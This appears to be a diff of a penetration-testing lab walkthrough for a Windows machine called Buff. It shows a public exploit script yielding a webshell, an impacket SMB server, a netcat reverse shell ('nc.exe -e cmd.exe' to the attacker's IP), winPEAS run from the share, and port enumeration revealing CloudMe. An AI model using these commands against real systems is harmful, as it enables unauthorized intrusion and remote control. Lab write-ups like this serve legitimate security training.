@@ -56,36 +56,91 @@ C:\xampp\htdocs\gym\upload> whoami
 �
 buff\shaun
 ```
-
-
-
 ```console
-C:\xampp\htdocs\gym\upload> net user shaun
+C:\xampp\htdocs\gym\upload> type c:\users\shaun\Desktop\user.txt
 �PNG
 �
-User name                    shaun
-Full Name                    
-Comment                      
-User's comment               
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
+306d****************************
+********************************
+```
+```console
+└─$ sudo impacket-smbserver rogue . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-Password last set            16/06/2020 15:08:08
-Password expires             Never
-Password changeable          16/06/2020 15:08:08
-Password required            No
-User may change password     No
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+```
 
-Workstations allowed         All
-Logon script                 
-User profile                 
-Home directory               
-Last logon                   16/06/2020 22:38:46
+```console
+└─$ python2.7 48506.py http://buff.htb:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
 
-Logon hours allowed          All
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> \\10.10.16.16\rogue\nc.exe -e cmd.exe 10.10.16.16 1234
+```
 
-Local Group Memberships      *Users                
-Global Group memberships     *None                 
-The command completed successfully.
+```console
+PS C:\Users\shaun\Downloads> ls
+ls
+
+
+    Directory: C:\Users\shaun\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe  
+```
+
+
+Launch Files without transferring to victim
+
+on host
+```console
+└─$ sudo impacket-smbserver rogue . -smb2support
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+```
+
+on victim
+
+```console
+PS C:\users\shaun\Downloads> \\10.10.16.16\rogue\winPEASx64.exe
+```
+
+```console
+����������͹ Current TCP Listening Ports
+� Check for services restricted from the outside 
+  Enumerating IPv4 connections
+                                                                                                                               
+  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name
+
+  TCP        0.0.0.0               135           0.0.0.0               0               Listening         952             svchost
+  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
+  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         5816            svchost
+  TCP        0.0.0.0               7680          0.0.0.0               0               Listening         1072            svchost
+  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         8596            C:\xampp\apache\bin\httpd.exe
+  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         516             wininit
+  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1044            svchost
+  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1580            svchost
+  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         2252            spoolsv
+  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         668             services
+  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         688             lsass
+  TCP        10.129.2.18           139           0.0.0.0               0               Listening         4               System
+  TCP        10.129.2.18           8080          10.10.16.16           42504           Close Wait        8596            C:\xampp\apache\bin\httpd.exe
+  TCP        10.129.2.18           8080          10.10.16.16           55280           Established       8596            C:\xampp\apache\bin\httpd.exe
+  TCP        10.129.2.18           49847         10.10.16.16           445             Established       4               System
+  TCP        10.129.2.18           49848         10.10.16.16           1235            Established       6832            \\10.10.16.16\rogue\nc64.exe
+  TCP        127.0.0.1             3306          0.0.0.0               0               Listening         8628            C:\xampp\mysql\bin\mysqld.exe
+  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         4280            CloudMe
 ```
